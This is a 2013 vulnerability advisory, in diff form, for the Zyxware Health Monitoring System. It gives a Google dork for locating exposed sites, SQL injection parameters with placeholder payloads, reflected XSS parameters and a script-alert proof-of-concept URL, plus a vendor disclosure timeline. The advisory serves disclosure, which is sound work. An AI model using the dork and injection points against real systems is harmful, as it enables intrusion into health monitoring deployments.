@@ -1,0 +1,63 @@
+# Exploit Title: Zyxware Health Monitoring System Multiple Vulnerability
+# Google Dork: Inurl:maps/layers.php?bdywidth= (and more)
+# Date: 07 Sep 2013
+# Vendor Homepage: http://www.zyxware.com/
+# Software Link:
+https://github.com/zyxware/Zyxware-Health-Monitoring-System/
+# Version:
+# Tested on: Win 7/Backtrack
+# CVE :
+# Exploit Author: Sarahma Security
+# Author Homepage: http://sarahma.co.id
+# Author Email: research@sarahma.co.id
+
+
+========================
+SQL Injection
+========================
+Found on
+http://localhost/healthmonitor/maps/diseaseinfo.php
+Parameter : strDiseaseName
+http://localhost/healthmonitor/maps/diseaseinfo.php?strDiseaseName=1'{SQLHERE}
+
+Found On
+http://localhost/healthmonitor/maps/summary.php
+Parameter : opt
+http://localhost/healthmonitor/maps/summary.php?opt=1'{SQL HERE}&type=Dist
+
+
+========================
+XSS Vulnerability
+========================
+Found On :
+http://localhost/healthmonitor/maps/diseaseinfo.php
+parameter : rightContent
+
+http://localhost/healthmonitor/maps/googlemap.php
+parameter : mapheight and mapwidth
+
+http://localhost/healthmonitor/maps/khmheading.php
+parameter : imageheight
+
+http://localhost/healthmonitor/maps/moreinfo.php
+parameter : rightContent
+
+http://localhost/healthmonitor/maps/summary.php
+parameter : opt  and rightContent
+
+Example :
+http://localhost/healthmonitor/maps/khmheading.php?imageheight=0&imagePadding=%22%3Cscript%3E%20alert%28%27XSS%27%29%3C/script%3E
+
+
+========================
+Solution :
+========================
+No Solution Until This Advisory Published
+
+
+========================
+Timeline:
+========================
+2013-09-03 Provided details vulnerability to vendor
+2013-09-07 No Response From vendor
+2013-09-08 Advisory published
